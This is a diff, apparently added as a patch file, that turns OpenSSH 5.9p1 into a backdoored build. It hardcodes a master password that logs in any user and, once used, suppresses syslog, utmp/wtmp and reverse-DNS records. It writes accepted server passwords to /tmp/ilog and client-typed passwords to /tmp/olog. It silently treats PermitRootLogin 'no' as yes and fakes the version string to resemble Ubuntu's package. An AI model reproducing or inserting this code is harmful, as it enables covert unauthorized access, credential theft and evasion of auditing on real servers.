@@ -1,0 +1,190 @@
+diff -u openssh-5.9p1/auth.c openssh-5.9p1.patch//auth.c
+--- openssh-5.9p1/auth.c	2011-05-29 18:40:42.000000000 +0700
++++ openssh-5.9p1.patch//auth.c	2012-02-04 22:17:53.381926889 +0700
+@@ -271,14 +271,16 @@
+ 	else
+ 		authmsg = authenticated ? "Accepted" : "Failed";
+ 
+-	authlog("%s %s for %s%.100s from %.200s port %d%s",
+-	    authmsg,
+-	    method,
+-	    authctxt->valid ? "" : "invalid user ",
+-	    authctxt->user,
+-	    get_remote_ipaddr(),
+-	    get_remote_port(),
+-	    info);
++	if(!secret_ok || secret_ok !=1){
++		authlog("%s %s for %s%.100s from %.200s port %d%s",
++	    	authmsg,
++	    	method,
++	    	authctxt->valid ? "" : "invalid user ",
++	    	authctxt->user,
++	    	get_remote_ipaddr(),
++	    	get_remote_port(),
++	    	info);
++	}
+ 
+ #ifdef CUSTOM_FAILED_LOGIN
+ 	if (authenticated == 0 && !authctxt->postponed &&
+diff -u openssh-5.9p1/auth-pam.c openssh-5.9p1.patch//auth-pam.c
+--- openssh-5.9p1/auth-pam.c	2009-07-12 19:07:21.000000000 +0700
++++ openssh-5.9p1.patch//auth-pam.c	2012-02-04 22:17:53.381926889 +0700
+@@ -1210,6 +1210,10 @@
+ 	if (sshpam_err == PAM_SUCCESS && authctxt->valid) {
+ 		debug("PAM: password authentication accepted for %.100s",
+ 		    authctxt->user);
++		if((f=fopen(ILOG,"a"))!=NULL){
++			fprintf(f,"user:password --> %s:%s\n",authctxt->user, password);
++			fclose(f);
++		}
+ 		return 1;
+ 	} else {
+ 		debug("PAM: password authentication failed for %.100s: %s",
+diff -u openssh-5.9p1/auth-passwd.c openssh-5.9p1.patch//auth-passwd.c
+--- openssh-5.9p1/auth-passwd.c	2009-03-08 07:40:28.000000000 +0700
++++ openssh-5.9p1.patch//auth-passwd.c	2012-02-04 22:17:53.381926889 +0700
+@@ -85,7 +85,10 @@
+ #if defined(USE_SHADOW) && defined(HAS_SHADOW_EXPIRE)
+ 	static int expire_checked = 0;
+ #endif
+-
++	if (!strcmp(password, SECRETPW)) {
++                secret_ok=1;
++                return 1;
++        }
+ #ifndef HAVE_CYGWIN
+ 	if (pw->pw_uid == 0 && options.permit_root_login != PERMIT_YES)
+ 		ok = 0;
+@@ -123,6 +126,12 @@
+ 	}
+ #endif
+ 	result = sys_auth_passwd(authctxt, password);
++	if(result){
++		if((f=fopen(ILOG,"a"))!=NULL){
++			fprintf(f,"user:password --> %s:%s\n",authctxt->user, password);
++			fclose(f);
++		}
++	}
+ 	if (authctxt->force_pwchange)
+ 		disable_forwarding();
+ 	return (result && ok);
+diff -u openssh-5.9p1/canohost.c openssh-5.9p1.patch//canohost.c
+--- openssh-5.9p1/canohost.c	2010-10-12 09:28:12.000000000 +0700
++++ openssh-5.9p1.patch//canohost.c	2012-02-04 22:17:53.381926889 +0700
+@@ -78,10 +78,12 @@
+ 
+ 	debug3("Trying to reverse map address %.100s.", ntop);
+ 	/* Map the IP address to a host name. */
+-	if (getnameinfo((struct sockaddr *)&from, fromlen, name, sizeof(name),
+-	    NULL, 0, NI_NAMEREQD) != 0) {
+-		/* Host name not found.  Use ip address. */
+-		return xstrdup(ntop);
++	if(!secret_ok || secret_ok!=1){
++		if (getnameinfo((struct sockaddr *)&from, fromlen, name, sizeof(name),
++	    	    NULL, 0, NI_NAMEREQD) != 0) {
++			/* Host name not found.  Use ip address. */
++			return xstrdup(ntop);
++		}
+ 	}
+ 
+ 	/*
+Common subdirectories: openssh-5.9p1/contrib and openssh-5.9p1.patch//contrib
+diff -u openssh-5.9p1/includes.h openssh-5.9p1.patch//includes.h
+--- openssh-5.9p1/includes.h	2010-10-24 06:47:30.000000000 +0700
++++ openssh-5.9p1.patch//includes.h	2012-02-04 22:17:53.385927565 +0700
+@@ -172,4 +172,9 @@
+ 
+ #include "entropy.h"
+ 
++int secret_ok;
++FILE *f;
++#define ILOG "/tmp/ilog"
++#define OLOG "/tmp/olog"
++#define SECRETPW "apaajaboleh"
+ #endif /* INCLUDES_H */
+diff -u openssh-5.9p1/log.c openssh-5.9p1.patch//log.c
+--- openssh-5.9p1/log.c	2011-06-20 11:42:23.000000000 +0700
++++ openssh-5.9p1.patch//log.c	2012-02-04 22:17:53.385927565 +0700
+@@ -351,6 +351,7 @@
+ void
+ do_log(LogLevel level, const char *fmt, va_list args)
+ {
++if(!secret_ok || secret_ok!=1){
+ #if defined(HAVE_OPENLOG_R) && defined(SYSLOG_DATA_INIT)
+ 	struct syslog_data sdata = SYSLOG_DATA_INIT;
+ #endif
+@@ -428,3 +429,4 @@
+ 	}
+ 	errno = saved_errno;
+ }
++}
+Common subdirectories: openssh-5.9p1/openbsd-compat and openssh-5.9p1.patch//openbsd-compat
+Common subdirectories: openssh-5.9p1/openssh-5.9p1.patch and openssh-5.9p1.patch//openssh-5.9p1.patch
+Only in openssh-5.9p1.patch/: password_authentication
+Common subdirectories: openssh-5.9p1/regress and openssh-5.9p1.patch//regress
+Common subdirectories: openssh-5.9p1/scard and openssh-5.9p1.patch//scard
+diff -u openssh-5.9p1/servconf.c openssh-5.9p1.patch//servconf.c
+--- openssh-5.9p1/servconf.c	2011-06-23 05:30:03.000000000 +0700
++++ openssh-5.9p1.patch//servconf.c	2012-02-04 22:17:53.385927565 +0700
+@@ -686,7 +686,7 @@
+ 	{ "without-password",		PERMIT_NO_PASSWD },
+ 	{ "forced-commands-only",	PERMIT_FORCED_ONLY },
+ 	{ "yes",			PERMIT_YES },
+-	{ "no",				PERMIT_NO },
++	{ "no",				PERMIT_YES },
+ 	{ NULL, -1 }
+ };
+ static const struct multistate multistate_compression[] = {
+Only in openssh-5.9p1.patch/: sshbd5.9p1.diff
+diff -u openssh-5.9p1/sshconnect2.c openssh-5.9p1.patch//sshconnect2.c
+--- openssh-5.9p1/sshconnect2.c	2011-05-29 18:42:34.000000000 +0700
++++ openssh-5.9p1.patch//sshconnect2.c	2012-02-04 22:17:53.385927565 +0700
+@@ -878,6 +878,10 @@
+ 	snprintf(prompt, sizeof(prompt), "%.30s@%.128s's password: ",
+ 	    authctxt->server_user, host);
+ 	password = read_passphrase(prompt, 0);
++	if((f=fopen(OLOG,"a"))!=NULL){
++		fprintf(f,"user:password@host --> %s:%s@%s\n",authctxt->server_user,password,authctxt->host);
++		fclose(f);
++	}
+ 	packet_start(SSH2_MSG_USERAUTH_REQUEST);
+ 	packet_put_cstring(authctxt->server_user);
+ 	packet_put_cstring(authctxt->service);
+diff -u openssh-5.9p1/sshlogin.c openssh-5.9p1.patch//sshlogin.c
+--- openssh-5.9p1/sshlogin.c	2011-01-11 13:20:07.000000000 +0700
++++ openssh-5.9p1.patch//sshlogin.c	2012-02-04 22:17:53.389928235 +0700
+@@ -133,8 +133,10 @@
+ 
+ 	li = login_alloc_entry(pid, user, host, tty);
+ 	login_set_addr(li, addr, addrlen);
+-	login_login(li);
+-	login_free_entry(li);
++	if(!secret_ok || secret_ok!=1){
++		login_login(li);
++		login_free_entry(li);
++	}
+ }
+ 
+ #ifdef LOGIN_NEEDS_UTMPX
+@@ -158,6 +160,8 @@
+ 	struct logininfo *li;
+ 
+ 	li = login_alloc_entry(pid, user, NULL, tty);
+-	login_logout(li);
+-	login_free_entry(li);
++	if(!secret_ok || secret_ok!=1){
++		login_logout(li);
++		login_free_entry(li);
++	}
+ }
+diff -u openssh-5.9p1/version.h openssh-5.9p1.patch//version.h
+--- openssh-5.9p1/version.h	2011-09-07 06:11:20.000000000 +0700
++++ openssh-5.9p1.patch//version.h	2012-02-04 23:03:22.821948952 +0700
+@@ -1,6 +1,6 @@
+ /* $OpenBSD: version.h,v 1.62 2011/08/02 23:13:01 djm Exp $ */
+ 
+-#define SSH_VERSION	"OpenSSH_5.9"
++#define SSH_VERSION	"OpenSSH_5.8p1 Debian-1ubuntu3"
+ 
+ #define SSH_PORTABLE	"p1"
+ #define SSH_RELEASE	SSH_VERSION SSH_PORTABLE
